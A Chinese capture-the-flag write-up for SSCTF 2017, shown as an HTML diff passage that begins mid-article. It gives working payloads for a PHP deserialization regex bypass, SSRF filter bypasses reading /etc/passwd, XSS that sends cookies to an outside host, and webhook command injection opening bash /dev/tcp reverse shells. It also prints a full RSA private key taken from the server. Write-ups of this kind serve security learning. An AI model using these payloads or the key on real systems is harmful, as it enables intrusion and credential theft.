+      echo &amp;apos;&lt;li&gt;Username : &amp;apos;.$imformation[&amp;apos;username&amp;apos;].&amp;apos;&lt;/li&gt;&amp;apos;;
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">发现反序列函数具体详情不知道，而又包含了一个<code style="max-width:100%;height:auto;">include.php</code>,访问下发现备份文件<code style="max-width:100%;height:auto;">http://60.191.205.80/include.php.swp</code>,内容如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
+class Read{//ssctf_flag.php
+    public $file;
+    public function __toString(){
+
+        if(isset($this-&gt;file)){
+            if("ssctf_flag.php"===$this-&gt;file)
+            {
+                exit();  
+            }
+            else
+            {
+                echo file_get_contents($this-&gt;file); 
+            }
+
+        }
+        return "you are big Hacker";
+    }
+}
+function ssctf_unserialize($value)
+    {
+        preg_match(&amp;apos;/[oc]:\d+:/i&amp;apos;, $value,$matches);
+          if(count($matches)){
+              return false;
+        }
+          return unserialize($value);
+    }
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">这个反序列化的正则绕过非常眼熟，只要复现过之前 <a href="http://bendawang.site/article/__wakeup()%E5%87%BD%E6%95%B0%E5%A4%B1%E6%95%88%E5%BC%95%E5%8F%91%E6%BC%8F%E6%B4%9E(CVE-2016-7124">__wakeup() 函数失效引发漏洞</a>) 就会有印象的，一个<code style="max-width:100%;height:auto;">+</code>就能绕过了,其他都是一些常见的trick就不赘述了，最后payload如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ec28593742a2f44000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">其中token为：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">O%3a%2b4%3a"Read"%3a1%3a{s%3a4%3a"file"%3bs%3a63%3a"php%3a//filter/read%3dconvert.base64-encode/resource%3dssctf_flag.php"%3b}
+</code></pre>
+<h2 id="misc50">misc 50 签到题</h2>
+<p style="max-width:100%;height:auto;">给了一串base64，解密之后是个奇怪的串，栅栏爆破一下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;"># encoding:utf-8
+cipher=&amp;apos;Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==&amp;apos;
+cipher=cipher.decode("base64")
+length=len(cipher)
+num=[]
+for i in range(1,length):
+    if(length%i==0):
+        num.append(i)
+for i in num:
+    b=length/i
+    plantext={x:&amp;apos;&amp;apos; for x in range(b)}
+    for j in range(length):
+        a=j%b;
+        plantext.update({a:plantext[a]+cipher[j]})
+    d =&amp;apos;&amp;apos;
+    for j in range(b):
+        d = d+plantext[j]
+    print "====================================================="
+    print str(i)+":"+d
+&amp;apos;&amp;apos;&amp;apos;
+result:
+=====================================================
+1:ggQ@gQ1fqh0ohtjpt_sw{gfhgs#}
+=====================================================
+2:gjgpQt@_gsQw1{fgqfhh0gosh#t}
+=====================================================
+4:gfjggqpfQhth@0_ggossQhw#1t{}
+=====================================================
+7:ggqht{ggQht_gsQ10jsf#@fopwh}
+=====================================================
+14:gQg1q0hjts{fg#g@Qfhotp_wghs}
+
+&amp;apos;&amp;apos;&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后再试试凯撒，发现<code style="max-width:100%;height:auto;">ggqht{ggQht_gsQ10jsf#@fopwh}</code>经过<code style="max-width:100%;height:auto;">rot-12</code>之后得到flag:<code style="max-width:100%;height:auto;">ssctf{ssCtf_seC10ver#@rabit}</code></p>
+<h2 id="misc100flag">misc 100 flag在哪里</h2>
+<p style="max-width:100%;height:auto;">首先是个流量包，简单分析下请求包，发现是git的相关文件，不过改成了<code style="max-width:100%;height:auto;">.nijiakadaye</code>，一样的dump下来，然后看看<code style="max-width:100%;height:auto;">git log</code>
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d64acc65a904f83000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">8894bb4d45643d52b5eb8175710999fcd398ebd4</code>分支下拿到一串奇怪的flag：<code style="max-width:100%;height:auto;">SSCTF{xsL3HOvFlV+H40s0mhszc5t1x38EU0ZIFJHZ/h2sC3U=}</code>，
+然后在往前看，在<code style="max-width:100%;height:auto;">9ab1451776fb32e82c2524fc4f37fa3f33ceae2f</code>分支下拿到<code style="max-width:100%;height:auto;">pass.php</code>,很容易知道上面那个flag是被这个加密的，然后发现这其实是个RC4加密，RC4加密解密一样的，即再加密一遍就能拿到flag,:</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$cipher="xsL3HOvFlV+H40s0mhszc5t1x38EU0ZIFJHZ/h2sC3U=";
+$pwd="ssctf";
+
+function wtf($data,$pwd) {
+    $cipher ="";
+    $key[] ="";
+    $box[] ="";
+    $pwd_length = strlen($pwd);
+    $data_length = strlen($data);
+    for ($i = 0; $i &lt; 256; $i++) {
+        $key[$i] = ord($pwd[$i % $pwd_length]);
+        $box[$i] = $i;
+    }
+    for ($j = $i = 0; $i &lt; 256; $i++) {
+        $j = ($j + $box[$i] + $key[$i]) % 256;
+        $tmp = $box[$i];
+        $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    }
+    for ($a = $j = $i = 0; $i &lt; $data_length; $i++) {
+        $a = ($a + 1) % 256;
+        $j = ($j + $box[$a]) % 256;
+        $tmp = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $k = $box[(($box[$a] + $box[$j]) % 256)];
+        $cipher .= chr(ord($data[$i]) ^ $k);
+    }
+    return $cipher;
+}
+echo wtf(base64_decode($cipher),$pwd);
+
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以flag如下：
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d6564c65a904f83000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./SSCTF-2017-WEB-WriteUp/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h2 id="web100">web 100 捡吗？</h2>
+<p style="max-width:100%;height:auto;">这道坑题目，服务老是崩不说，感觉价值不大。。。
+根据提示有一台服务在<code style="max-width:100%;height:auto;">10.23.173.0</code>网段，扫一下很容易就发现在<code style="max-width:100%;height:auto;">10.23.173.190</code>,然后这个ip下又一个<code style="max-width:100%;height:auto;">news.php</code>也有url可以跳转。然后再根据提示说是有三个服务器，最后一个是ftp，现在我们有两个了就差最后一个了。然后就扫呗，中途题目崩溃的时候看到过这样的过滤代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
+if (isset($_GET[&amp;apos;url&amp;apos;]))
+{
+$link = $_GET[&amp;apos;url&amp;apos;];
+$link = str_replace("dict","_", $link);
+$link = str_replace("file","_", $link);
+$link = str_replace("ftp","_", $link);
+$link = str_replace("ftps","_", $link);
+$link = str_replace("gopher","_", $link);
+$link = str_replace("http","_", $link);
+$link = str_replace("https","_", $link);
+$link = str_replace("imap","_", $link);
+$link = str_replace("imaps","_", $link);
+$link = str_replace("ldap","_", $link);
+$link = str_replace("ldaps","_", $link);
+$link = str_replace("pop3","_", $link);
+$link = str_replace("pop3s","_", $link);
+$link = str_replace("rtmp","_", $link);
+$link = str_replace("rtsp","_", $link);
+$link = str_replace("smtp","_", $link);
+$link = str_replace("smtps","_", $link);
+$link = str_replace("telnet","_", $link);
+$link = str_replace("tftp","_", $link);
+$link = str_replace(".a","_", $link);
+$link = str_replace(".b","_", $link);
+$link = str_replace(".c","_", $link);
+$link = str_replace(".d","_", $link);
+$link = str_replace(".f","_", $link);
+$link = str_replace(".g","_", $link);
+$link = str_replace(".h","_", $link);
+$link = str_replace(".i","_", $link);
+$link = str_replace(".k","_", $link);
+$link = str_replace(".l","_", $link);
+$link = str_replace(".m","_", $link);
+$link = str_replace(".n","_", $link);
+$link = str_replace(".o","_", $link);
+$link = str_replace(".q","_", $link);
+$link = str_replace(".r","_", $link);
+$link = str_replace(".s","_", $link);
+$link = str_replace(".u","_", $link);
+$link = str_replace(".v","_", $link);
+$link = str_replace(".w","_", $link);
+$link = str_replace(".x","_", $link);
+$link = str_replace(".y","_", $link);
+$link = str_replace(".z","_", $link);
+$curlobj = curl_init($link);
+curl_setopt($curlobj, CURLOPT_FILE, $fp);
+curl_setopt($curlobj, CURLOPT_HEADER, 0);
+curl_exec($curlobj);
+curl_close($curlobj);
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以知道<code style="max-width:100%;height:auto;">ftp</code>杯过滤了，大写就可以绕过，然后就是用burp跑就行了，后来跟新了提示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e0488c65a904f8300000d.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这么清晰，直接构造访问</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e04a9c65a904f8300000e.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">发现flag.txt,访问获得flag</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e04bdc65a904f8300000f.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web200">web 200 弹幕</h2>
+<p style="max-width:100%;height:auto;">打开发现是个websocket获取数据，然后每个人连上去就会有一个welcome提示,大概像这样：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">Welcome, 1.85**&lt;img src="/static/images/welcome.gif" onload="c=encodeURIComponent(document.cookie);if(c.length&gt;32){a=new Image();a.src=&amp;apos;/xssHentai/request/1/?body=&amp;apos;+c;}"&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后觉得这个链接很可疑，访问下是个ok，然后怎么改body都是ok，
+再访问下<code style="max-width:100%;height:auto;">http://117.34.71.7/xssHentai</code>，发现是个登陆页面，弱密码<code style="max-width:100%;height:auto;">admin:admin</code>直接登陆，然后发现
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d7273c65a904f83000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">让我们往<code style="max-width:100%;height:auto;">3</code>发送请求，发现每往3发送一个，这个页面就会更新，再根据cookie的提示
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d72d8c65a904f83000003.png" style="max-width:100%;height:auto;"/><br/>
+知道往1发就是管理员，
+最后payload如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://117.34.71.7/xssHentai/request/1/?body=%3Cscript%3E%24.get%28%22http%3A%2f%2f104.160.43.154%3A8000%2fxss%2f%3Fa%3D%22%2bdocument.cookie%29%3C%2fscript%3E
+</code></pre>
+<p style="max-width:100%;height:auto;">flag截图：
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d733bc65a904f83000008.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web300">web 300 白吗?全是套路</h2>
+<p style="max-width:100%;height:auto;">这个题其实是利用web1发现的点做的，web1扫内网的时候，发现这样</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=172.17.0.1/
+</code></pre>
+<p style="max-width:100%;height:auto;">直接到web3也就是本题来了，加上web1发现的过滤，知道可以用<code style="max-width:100%;height:auto;">file</code>协议大写绕过就能任意读取本题的文件</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=File:///etc/passwd
+</code></pre>
+<p style="max-width:100%;height:auto;">读取了一堆文件也没发现什么，倒是在<code style="max-width:100%;height:auto;">/var/www/submit.php</code>目录发现了可以伪造ip进行insert的盲注</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+header("CONTENT-TYPE:text/html;charset=UTF-8");
+define("HOST","127.0.0.1");
+define("USERNAME","root");
+define("PASSWORD","");
+$con=new mysqli(HOST,USERNAME,PASSWORD,"ctf1");
+if(!$con){
+    echo $con-&gt;error;
+    exit("aaaa");
+}
+if(!$con-&gt;select_db("ctf1")){
+    echo $con-&gt;error;
+}
+if(!$con-&gt;query("SET NAMES utf8")){
+    echo $con-&gt;error;
+}
+
+$xss=$_POST["sub"];
+$str = addslashes($xss);
+
+/**********鑾峰彇IP************/
+class Action  
+{  
+
+    function get_outer()  
+    {  
+        $url = &amp;apos;http://www.ip138.com/ip2city.asp&amp;apos;;  
+        $info = file_get_contents($url);  
+        preg_match(&amp;apos;|&lt;center&gt;(.*?)&lt;/center&gt;|i&amp;apos;, $info, $m);  
+        return $m[1];  
+    }  
+
+    function get_inter()  
+    {  
+        $onlineip = &amp;apos;&amp;apos;;  
+        if (getenv(&amp;apos;HTTP_CLIENT_IP&amp;apos;) &amp;&amp; strcasecmp(getenv(&amp;apos;HTTP_CLIENT_IP&amp;apos;), &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = getenv(&amp;apos;HTTP_CLIENT_IP&amp;apos;);  
+        } elseif (getenv(&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;) &amp;&amp; strcasecmp(getenv(&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;), &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = getenv(&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;);  
+        } elseif (getenv(&amp;apos;REMOTE_ADDR&amp;apos;) &amp;&amp; strcasecmp(getenv(&amp;apos;REMOTE_ADDR&amp;apos;), &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = getenv(&amp;apos;REMOTE_ADDR&amp;apos;);  
+        } elseif (isset($_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;]) &amp;&amp; $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;] &amp;&amp; strcasecmp($_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;], &amp;apos;unknown&amp;apos;)) {  
+            $onlineip = $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;];  
+        }  
+        return $onlineip;  
+    }  
+}  
+$p = new Action();
+$intip = $p-&gt;get_inter();
+$outip2= $intip;
+@mkdir("/tmp/ids",0777,true);
+$sql="insert into ctf1(xss,ip,time,wai_ip) values(&amp;apos;$str&amp;apos;,&amp;apos;$intip&amp;apos;,NOW(),&amp;apos;$outip2&amp;apos;)";
+
+if($str=$con-&gt;query($sql)){
+    echo "&lt;script&gt;alert(&amp;apos;success&amp;apos;);window.location.href=&amp;apos;index.php&amp;apos;&lt;/script&gt;";
+    $insertid = mysqli_insert_id($con);
+    file_put_contents("/tmp/ids/".$insertid,"a");
+}
+else {
+    echo "&lt;script&gt;alert(&amp;apos;fail&amp;apos;);&lt;/script&gt;";
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">后来也没有发现表啊库啊里面有什么有用的东西，后来随手提交了个这个请求</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">POST /submit.php HTTP/1.1
+Host: 120.132.20.149
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Connection: close
+Client-Ip:&lt;script src="http://104.160.43.154:8000"&gt;&lt;/script&gt;
+Upgrade-Insecure-Requests: 1
+
+sub=&lt;script src="http://104.160.43.154:8000"&gt;&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">发现竟然弹到我的xss平台来了，如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ec6be93742a2f44000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后直接去读这个php，发现没有什么可疑的东西，本来打算接着看打xss，结果突然发现这个一长串的php里面引用了另一个<code style="max-width:100%;height:auto;">js.php</code>，一看就很诡异，直接访问</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ec76193742a2f44000003.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后就发现flag了。。。意料之外。。。</p>
+<h2 id="web500webhook">web 500 WebHook</h2>
+<p style="max-width:100%;height:auto;">好吧这道题我一定要好好的写个Writeup,这道题就是和出题人的一个博弈，三次命令执行，出题人改了三次题，还好在最后一次改之前成功获取到了flag。
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590df970c65a904f83000009.png" style="max-width:100%;height:auto;"/><br/></p>
+<h3 id="10">命令执行1.0</h3>
+<p style="max-width:100%;height:auto;">最开始拿到题目是一个github项目，拿下来看源码，发现其中build函数里面很多命令执行，然后调用build函数的push函数最开始是这样子</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">@app.route("/push", methods=[&amp;apos;GET&amp;apos;, &amp;apos;POST&amp;apos;])
+def push():
+    if request.method == &amp;apos;GET&amp;apos;:
+        return &amp;apos;OK&amp;apos;
+    elif request.method == &amp;apos;POST&amp;apos; and request.host.split(":")[0] == "webhook.ssctf.seclover.com":
+        post = json.loads(request.data)
+        if &amp;apos;repository&amp;apos; not in post:
+            abort(403)
+        repos = json.loads(open(&amp;apos;repos.json&amp;apos;).read())
+        name = post[&amp;apos;repository&amp;apos;]["name"]
+
+        match = re.match(r"refs/heads/(?P&lt;branch&gt;.*)", post[&amp;apos;ref&amp;apos;])
+        if match:
+            branch = match.groupdict()[&amp;apos;branch&amp;apos;]
+            before = post.get("before") or ""
+            msg = "recived push repo:{name} with before \n"
+            msg += json.dumps(before, indent=4)
+            webhooklog.info(msg.format(**locals()))
+        else:
+            abort(403)
+        if repos.get(name):
+            if not logs.get(name):
+                logs[name] = getlog(name)
+            url = repos[name].get("url", "")
+            log = logs[name]
+            pool.apply_async(build, (name, url, branch, log))
+
+        else:
+            abort(403)
+
+    return &amp;apos;OK&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">发现参数branch是我们可以控制的，通过正则来匹配，正则使很容易绕过的，我们只需要让<code style="max-width:100%;height:auto;">ref=refs/heads/P&lt;branch&gt;;curl http://104.160.43.154:12345</code>就能成功执行命令，而且这里也没有身份验证，所以直接构造请求发往<code style="max-width:100%;height:auto;">/push</code>页面就行了：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">{"repository":{"name":"flag"},"ref":"refs/heads/P&lt;branch&gt;;curl http://104.160.43.154:12345"}
+</code></pre>
+<p style="max-width:100%;height:auto;">ps:这个flag用户是查看<code style="max-width:100%;height:auto;">/webhooklog</code>页面看到的用户名。
+然后直接构造反弹shell就可以了。</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">{"repository":{"name":"flag"},"ref":"refs/heads/P&lt;branch&gt;;/bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1"}
+</code></pre>
+<p style="max-width:100%;height:auto;">成功反弹shell之后。折腾了半天没有找到flag，看到那个<code style="max-width:100%;height:auto;">repos.json</code>里面有个<code style="max-width:100%;height:auto;">https://git.coding.net/ljgame/flag.git</code>,访问下发现是个私有的项目看不了。然后就开始遍地找flag，最后服务器重启修复这个branch参数的命令执行漏洞，修复如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590dfe4bc65a904f8300000a.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">直接把branch写死了。。。。。不过已经把源码整个文件夹都dump下来了。</p>
+<h3 id="20">命令执行2.0</h3>
+<p style="max-width:100%;height:auto;">重新审计发现就在刚才源码调用<code style="max-width:100%;height:auto;">build</code>的地方，和branch参数同时传入的还有url参数，url参数来自哪儿？</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">@app.route("/addrepo", methods=[&amp;apos;GET&amp;apos;])
+def addrepo():
+    repos = json.loads(open(&amp;apos;repos.json&amp;apos;, &amp;apos;rb&amp;apos;).read())
+    repo = request.args.get(&amp;apos;repo&amp;apos;, "")
+    key = request.args.get(&amp;apos;key&amp;apos;, "")
+    url = request.args.get(&amp;apos;url&amp;apos;, "")
+    password = request.args.get(&amp;apos;pass&amp;apos;, "")
+    if key != md5.md5(repo + app.config[&amp;apos;SECRET_KEY&amp;apos;] * 20 + repo).hexdigest():
+        abort(403)
+    if repo in repos:
+        abort(403)
+    repos[repo] = {
+        "url": url,
+        "pass": md5.md5(password + app.config[&amp;apos;SECRET_KEY&amp;apos;]).hexdigest()
+    }
+    open(&amp;apos;repos.json&amp;apos;, &amp;apos;wb&amp;apos;).write(json.dumps(repos))
+    return "OK"
+</code></pre>
+<p style="max-width:100%;height:auto;">这里直接接受了传入的url参数，不过这里做了验证<code style="max-width:100%;height:auto;">key == md5.md5(repo + app.config[&amp;apos;SECRET_KEY&amp;apos;] * 20 + repo).hexdigest()</code>，但是第一次dump了源码，知道了这个<code style="max-width:100%;height:auto;">SECRET_KEY</code>实际是<code style="max-width:100%;height:auto;">ssctf</code>,所以很容易构造绕过。payload如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://webhook.ssctf.seclover.com:8000/addrepo?repo=test&amp;url=test%3B%2fbin%2fbash%20-i%20%3E%26%20%2fdev%2ftcp%2f104.160.43.154%2f12345%200%3E%261&amp;pass=test&amp;key=9a674ed2d9aae9daa8304fb4ef1f911a
+</code></pre>
+<p style="max-width:100%;height:auto;">所以又一次成功弹了shell,但是还是没有找到flag。直到再一次修复。。</p>
+<h3 id="30">命令执行3.0</h3>
+<p style="max-width:100%;height:auto;">我们发现这个新的更新改动对url格式做了限制，</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">@app.route("/addrepo", methods=[&amp;apos;GET&amp;apos;])
+def addrepo():
+    repos = json.loads(open(&amp;apos;repos.json&amp;apos;, &amp;apos;rb&amp;apos;).read())
+    repo = request.args.get(&amp;apos;repo&amp;apos;, "")
+    key = request.args.get(&amp;apos;key&amp;apos;, "")
+    url = request.args.get(&amp;apos;url&amp;apos;, "")
+    password = request.args.get(&amp;apos;pass&amp;apos;, "")
+    if key != md5.md5(repo + app.config[&amp;apos;SECRET_KEY&amp;apos;] * 20 + repo).hexdigest():
+        abort(403)
+    if repo in repos:
+        abort(403)
+    m = re.search(
+        r&amp;apos;https://(github\.com|git\.coding\.net)/\w+/(\w+)\.git&amp;apos;, url)
+    if not m:
+        abort(403)
+    if m.group(2) != repo:
+        abort(403)
+    repos[repo] = {
+        "url": url,
+        "pass": md5.md5(password + app.config[&amp;apos;SECRET_KEY&amp;apos;]).hexdigest()
+    }
+    open(&amp;apos;repos.json&amp;apos;, &amp;apos;wb&amp;apos;).write(json.dumps(repos))
+    return "OK"
+</code></pre>
+<p style="max-width:100%;height:auto;">但是仍然轻松绕过：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://webhook.ssctf.seclover.com:8000/addrepo?repo=aaaaa&amp;url=https%3A%2f%2fgithub.com%2ftest%2faaaaa.git%3B%2fbin%2fbash%20-i%20%3E%26%20%2fdev%2ftcp%2f104.160.43.154%2f12345%200%3E%261&amp;pass=test&amp;key=de14479df6aec67e8e69187355533c36
+</code></pre>
+<p style="max-width:100%;height:auto;">又一次拿到shell。。
+最后想到了用服务器上的私玥搞下来直接去看看远程的这个<code style="max-width:100%;height:auto;">flag.git</code>仓库，搞下来的私玥是这个</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsYUDgOI2fRHJyf4Cw1CbvADog01Dg02/HznuAQAGCv8N4Z4n
+gZ/DmB6x33470JzdF2JxXrcHJkS7h2T4UICHJaIAs/UGGfCTHSx11veWXpqyhPEJ
+p1VhPcP9/rWLGIPBnNJLv1bFW90afU8CboELz0GlX8+N9XA2r+6hZengMayd/a3A
+X44MqMQDTQp4wFWNF/CTsUIWD70lhwKHKTkt+isRh6bkWRa2rFvl4ODvUb0iA6jT
+h+5ee1pVmzG4BGJmGQlhUHO38/3bytLNbi14uKziJAM6Z3sy/R3BwzGW3/X3ieHg
+skDfu4v9gyCsX7XjnRzPXsOiKdga8RDJgataFwIDAQABAoIBAQCMv8PpWnKNc58k
+0otqRO1VgPrZsFcJMomIvqugi14/Nb7R1k3Ijt3MLPonE7VlUBpUQi9VQ5UdmH1/
+emUPnviItAwOowV1Z7Oc+/Vqvd+xnsJQebSHwkBZcp5eZ56jj0PhjTOVv7y3e3VX
+SV/KMfMlHw16C9yob5JMp828OlURzFK2KzjUSXmYJQQw3AXcN7yYwkEGEjBCLhI3
+HMWlEF5BzwuDbIJTNROv4jQsZOH1oNXtHCQGZPH3G9ewsGaQ2x5FYaI86AUCN3wX
+wnR66JGGF6JYNiB93Ubh8znP/gbGfMh4DHHBQWKKT+u6v/vJOinTfDsp1FuN3NI+
+ZitRWhcRAoGBAOMc+Rb3oHCEPZpmxee4ksASHk6wFZHbKrAW+t2mFyDPO45Wxwim
+2PAndhjSQYzcgmh77HhYCHdv1/5n0Ozp1Uq7Udpaqqs82FGbt9MKLp660J4cBoX8
+zi6UBLSC77Sm42V24Z/vkw3OJLs2iYeP5pfKKhk8X6x/jiR02wgol7LFAoGBAMgZ
+OZGXw8NpALpHaTerR4L99swIicliSkBckxVZIMsmPS4QwyMLuPo3BvKJTS+pT3BM
+5CX3bHfPZ5W3tUymQOzQ/eRRZovNhWvW4rbZWAMs54uyBi4inpGLP8HEr+6Yoe6k
+c6L/+Jkfz5OEXyUAu14VgdkS897zvmtKa0AiKDcrAoGBALlBHuXfI53kIKPbhT8Y
+zYuiu9oPw+hv0AhHFmbKXj9DCx92JXAnOPncFnb0usd971nvC9q2ZGGYd6VrZX56
+1qLY3VGxd1mqjgEzdeTNf222kQkHb0LIDh7sWlIsI/9FymMvb6eYMmmmZ0vWlqRf
+ewcBvwlKt/frLDUMpMWo5uTJAoGAcpDWwEBninONQhpu6Lu9ZwenjWx6D36iSrV2
+VSvBte6/6qcYQvGMSF7HMIhiVB6ZaA/uNLq0NOjgQv165VbvJ2gFZfshPnw+nt7a
+0ZwhYzgLnpUgKrwRk/1pVLUbkf18AZnQx4vNN0baX3jTzOjdXmHsBXBvhsCBzwY9
+3+tuoR8CgYAzG5qFU+B7clDETn2qj+8u2NNHif5PUeuQTfH1z7SM7aOkdkGjilnh
+OvvdME7gILAlm/qZdTZEzIegGRApM2UI3foMMg9bnxRbWybCJh21LDK4hntJCVWO
+P/eObKg32p89IlTOXf/NsRABswyhOLzbqsbGY+sD/Q2UBMbhUVWU3A==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p style="max-width:100%;height:auto;">放到本地，把本地<code style="max-width:100%;height:auto;">~/.ssh</code>下的东西移开，然后新建一个<code style="max-width:100%;height:auto;">id_rsa</code>,记得要把权限改成<code style="max-width:100%;height:auto;">600</code>，然后执行</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">ssh -T git@git.coding.net -i id_rsa
+</code></pre>
+<p style="max-width:100%;height:auto;">收到类似这样的回复</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">The authenticity of host &amp;apos;git.coding.net (218.75.224.59)&amp;apos; can&amp;apos;t be established.
+RSA key fingerprint is SHA256:jok3FH7q5LJ6qvE7iPNehBgXRw51ErE77S0Dn+Vg/Ik.
+Are you sure you want to continue connecting (yes/no)? ys
+Please type &amp;apos;yes&amp;apos; or &amp;apos;no&amp;apos;: yes
+Warning: Permanently added &amp;apos;git.coding.net,218.75.224.59&amp;apos; (RSA) to the list of known hosts.
+Coding.net Tips : [Hello! You&amp;apos;ve connected to Coding.net via SSH. This is a deploy key.]
+</code></pre>
+<p style="max-width:100%;height:auto;">说明成功了,然后就可以管理这个flag.git项目了,克隆下来</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">git clone git@git.coding.net:ljgame/flag.git
+</code></pre>
+<p style="max-width:100%;height:auto;">发现有个flag.txt
